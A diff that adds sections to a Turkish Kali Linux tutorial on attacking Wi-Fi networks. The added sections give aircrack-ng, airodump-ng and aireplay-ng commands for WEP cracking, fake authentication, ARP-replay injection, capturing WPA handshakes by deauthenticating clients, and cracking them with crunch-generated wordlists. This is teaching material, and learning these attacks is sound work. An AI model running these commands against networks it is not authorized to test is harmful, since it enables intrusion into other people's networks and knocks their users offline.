@@ -44,6 +44,15 @@
     - [Belirli Bir Ağa Özel Bilgi Edinmek](#belirli-bir-a%c4%9fa-%c3%96zel-bilgi-edinmek)
     - [Deauth Saldırısı](#deauth-sald%c4%b1r%c4%b1s%c4%b1)
   - [Ağlara Saldırmak](#a%c4%9flara-sald%c4%b1rmak-1)
+    - [Encryption (Şifreleme Modelleri)](#encryption-%c5%9eifreleme-modelleri)
+      - [WEP](#wep)
+        - [WEP Cracking](#wep-cracking)
+        - [Fake Auth (Sahte Yetkilendirme)](#fake-auth-sahte-yetkilendirme)
+        - [Package Injection (Paket Enjeksiyonu)](#package-injection-paket-enjeksiyonu)
+      - [WPA](#wpa)
+        - [Handshake Yakalamak](#handshake-yakalamak)
+        - [Wordlist Oluşturmak](#wordlist-olu%c5%9fturmak)
+        - [Handshake'e Karşı Wordlist Kullanmak](#handshakee-kar%c5%9f%c4%b1-wordlist-kullanmak)
 
 # Giriş
 Bu döküman **Linux** işletim sisteminin **Kali Linux** dağıtımı üzerinde hazırlanmıştır. İlgili sistem bilgileri aşağıda bulunmaktadır.<br>
@@ -500,3 +509,76 @@ Bu saldırıda mantık şu şekilde işlemektedir; **kaynak, düşürmeye çalı
 ![aireplay-ng deauth](./assets/9-deauth.png)
 
 ## Ağlara Saldırmak
+**Ufak Bir Not:** <br>
+Bu bölümdeki işlemleri yaparken ağ arayüzümüzün **monitör** modda olduğundan emin olalım. Aynı zamanda `wlan0` ve `wlon0mon` argümanlarının kendi ağ arayüzlerinizi temsil ettiğinden lütfen emin olun. :innocent:
+### Encryption (Şifreleme Modelleri)
+- WEP (Wired Equivalent Privacy)
+  - Authentication (Kimlik doğrulama) yoktur.
+  - Kırılması WPA'ye göre daha kolaydır.
+- WPA (Wi-Fi Protected Access)
+  - TKIP,Wpa şifreleme için kabul edildi. Wep’te değişmeyen 64bit ve 128bit şifreleme anahtarı kullanılmıştır. 
+  - TKIP her paket için dinamik olarak yeni bir 128bit anahtar üretir ve bu yönüyle wep’teki zaafiyetlerin önüne geçti.
+  - Wpa’nın saldırganlara yönelik attığı adım ile saldırganın veri paketlerini değiştirmesini ve değiştirdiği paketlerin gönderilmesini önlemek için tasarlanmış bir ileti bütünlüğü kontrolü(Message Integrity Check) sağlamaktadır.
+- WPA2 (Wi-Fi Protected Access) 
+  - Şuan hala kullanımımız da bulunan en güvenilir kablosuz ağ şifrelemesidir. 
+  - TKIP’den, hem gizlilik hem de bütünlük açısından korunmasında önemli ölçü de güçlüdür.
+  - Aes güçlü güvenlik tabanlı şifreleme içerdiği için 2004’te sertifikası başladı ve 2006 dan itibaren tüm yeni cihazlarda WPA2 sertifikası zorunlu kılındı.
+#### WEP
+##### WEP Cracking
+WEP cracking yaparken adım adım şu yolları izleyeceğiz:
+- Etraftaki ağları izleyip **WEP şifrelemesine sahip** bir hedef ağ belirleyeceğiz -> `airodump-ng wlan0mon`
+- Hedef ağa karşı sniffing yapacağız. Ardından ele geçirdiğimiz bilgileri dosyaya yazacağız -> `airodump-ng --channel <channel> --bssid <bssid> --write <file-name> <interface>`
+-  `aircrack-ng` sayesinde verileri decrypt ederek şifreyi kırmaya çalışacağız. -> `aircrack-ng <filename.cap>` Unutmamalız ki bu işlem paket alış-verişi yapılırken gerçekleşecektir. Bu sebeple bir yandan da `airodump-ng` ile hedef ağa dair bilgileri toplamaya devam etmeliyiz. 5000 pakette bir deneme yapacaktır ve bulduğu an bize şifreyi verecektir.
+-  Dönen şifre içerisinden `:` işaretlerini kaldırmalıyız
+##### Fake Auth (Sahte Yetkilendirme)
+[WEP Cracking](#wep-cracking) yaparken ağ üzerindeki paketleri izlediğimizi söylemiştik. Peki ya hiç paket alış-verişi yoksa ne yapacağız? Kendimizi ağa tanıtıp bizi dinlemesini sağlayabiliriz. Tam bu noktada Fake Auth saldırısı ile kendimizi sahte olarak yetkilendirebilir ve hedef ağa paket enjekte edebiliriz. <br>
+Temel komut dizilimi şu şekildedir -> `aireplay-ng --fakeauth 0 -a <hedef_mac> -h <kendi_mac_adresimiz> <ag_arayuzu/interface>` <br>
+Bu komuttan sonra tekrar hedef ağa `airodump-ng` ile sniffing yaparsak kendi MAC adresimizi de ağa bağlı cihazlar listesinde görebiliriz. Fakat sadece ağa kendimizi tanıtmış olduk, bu ağı şu an kullanamayız.
+##### Package Injection (Paket Enjeksiyonu)
+Hedef ağ üzerinde paket alış-verişi yaparak veri akışını sağlarız
+- Önce hedef ağa Fake Auth ile kendimizi tanıtırız/yetkilendiririz
+- Temel komut dizilimi şu şekildedir -> `aireplay-ng --arpreplay -b <hedef_mac> -h <kendi_mac_adresimiz> <ag_arayuzu/interface>`
+- Bu komuttan sonra hedef ağ üzerinde çok sayıda paket alış-verişi yapılmaya başlanır. Ardından `airodump-ng` ile izlediğimiz ağdan elde ettiğimiz verileri yazdığımız dosyayı `aircrack-ng` ile decrypt ederek şifreyi bulmaya çalışırız
+
+#### WPA
+Öncelikle [Handshake](#handshake-3-way-handshake) yakalamaya çalışacağız. İçinde muhtemel şifrelerin olduğu bir **Wordlist** hazırlayacağız ve oluşturduğumuz Handshake'e karşı şifreleri deneyeceğiz
+##### Handshake Yakalamak
+`airodump-ng` Handshake'i yeni bir kişi ağa bağlanınca yakalayabilir. 2 şey yapabiliriz.
+- 1-) Bekleriz ki yeni birisi ağa bağlansın
+- 2-) Mevcut ağa bağlı birini [Deauth Saldırısı](#deauth-sald%c4%b1r%c4%b1s%c4%b1) ile ağdan düşürürüz ve yeniden bağlanmasını sağlarız. Yakalanan Handshake sağ üstte gözükecektir (`airodump-ng` ile hedef ağı izlerken). Yakaladığımız Handshake yazdığımız dosya içerisinde vardır ve oluşturduğumuz Wordlist'i bu Handshake'e karşı deneyebiliriz
+##### Wordlist Oluşturmak
+Wordlist oluşturmak **CRUNCH** adı verilen tool'u kullanabiliriz. <br>
+Temel komut dizimi şu şekildedir -> `crunch <min> <max> <char> -t <pattern> -o <dosya_adi>`
+```
+# crunch 8 9 xyz123 -o testwordlist
+>>> Crunch will now generate the following amount of data: 115893504 bytes                                                                                                
+110 MB                                                                                                                                                                
+0 GB                                                                                                                                                                  
+0 TB                                                                                                                                                                  
+0 PB                                                                                                                                                                  
+Crunch will now generate the following number of lines: 11757312                                                                                                      
+                                                                                                                                                                      
+crunch: 100% completed generating output 
+
+# cat testwordlist
+>>> xxzxx2z3                                                                                                                                                              
+xxzxx21x                                                                                                                                                              
+xxzxx21y                                                                                                                                                              
+xxzxx21z                                                                                                                                                              
+xxzxx211                                                                                                                                                              
+xxzxx212                                                                                                                                                              
+xxzxx213                                                                                                                                                              
+xxzxx22x                                                                                                                                                              
+xxzxx22y     
+.
+.
+.
+.
+
+```
+##### Handshake'e Karşı Wordlist Kullanmak
+Oluşturduğumuz Wordlist'i yakaladığımız Handshake'e karşı kullanacağız. <br>
+Temel komut dizimi şu şekildedir -> `aircrack-ng <yakaladigimiz_handshake_bulunan_dosya.cap> -w <word_list_dosyamiz>`
+```
+# aircrack-ng deneme-01.cap -w testwordlist
+```
